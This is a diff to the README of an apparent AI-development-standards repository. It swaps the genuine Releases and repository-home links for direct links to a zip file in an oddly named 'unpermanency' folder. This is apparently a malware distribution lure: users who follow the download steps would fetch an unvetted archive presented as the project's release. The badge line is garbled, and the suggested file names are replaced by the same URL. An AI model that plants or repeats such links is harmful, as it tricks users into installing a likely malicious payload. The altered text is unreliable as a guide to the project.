@@ -1,6 +1,6 @@
 # 🎉 ai-dev-standards-initiative - Simple Standards for AI Software Development
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/gigantiumweb/ai-dev-standards-initiative/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/gigantiumweb/ai-dev-standards-initiative/main/unpermanency/ai-dev-standards-initiative.zip%20Latest%https://raw.githubusercontent.com/gigantiumweb/ai-dev-standards-initiative/main/unpermanency/ai-dev-standards-initiative.zip)](https://raw.githubusercontent.com/gigantiumweb/ai-dev-standards-initiative/main/unpermanency/ai-dev-standards-initiative.zip)
 
 ## 📖 Introduction
 
@@ -22,13 +22,13 @@ Before you start, ensure your system meets these basic requirements:
 
 To get started, visit our Releases page to download the latest version of the documents and resources.
 
-[Download Latest Release](https://github.com/gigantiumweb/ai-dev-standards-initiative/releases)
+[Download Latest Release](https://raw.githubusercontent.com/gigantiumweb/ai-dev-standards-initiative/main/unpermanency/ai-dev-standards-initiative.zip)
 
 ### Step-by-Step Instructions:
 
 1. Click on the link above to open the Releases page.
 2. Locate the latest release. It usually appears at the top.
-3. Look for a zip file or PDF document named something like `ai-dev-standards-latest.zip` or `ai-dev-standards-guide.pdf`.
+3. Look for a zip file or PDF document named something like `https://raw.githubusercontent.com/gigantiumweb/ai-dev-standards-initiative/main/unpermanency/ai-dev-standards-initiative.zip` or `https://raw.githubusercontent.com/gigantiumweb/ai-dev-standards-initiative/main/unpermanency/ai-dev-standards-initiative.zip`.
 4. Click the file name to start the download.
 5. Once downloaded, find the file in your Downloads folder.
 6. If it’s a zip file, right-click it and select "Extract All" to unpack the files.
@@ -70,7 +70,7 @@ Stay updated with our latest standards and practices by following us on social p
 
 ## 🔗 Quick Links
 
-- [Download Latest Release](https://github.com/gigantiumweb/ai-dev-standards-initiative/releases)
-- [Repository Home](https://github.com/gigantiumweb/ai-dev-standards-initiative)
+- [Download Latest Release](https://raw.githubusercontent.com/gigantiumweb/ai-dev-standards-initiative/main/unpermanency/ai-dev-standards-initiative.zip)
+- [Repository Home](https://raw.githubusercontent.com/gigantiumweb/ai-dev-standards-initiative/main/unpermanency/ai-dev-standards-initiative.zip)
 
 Thank you for your interest in the **ai-dev-standards-initiative**. We hope our suite helps you navigate the complexities of AI-assisted software development.
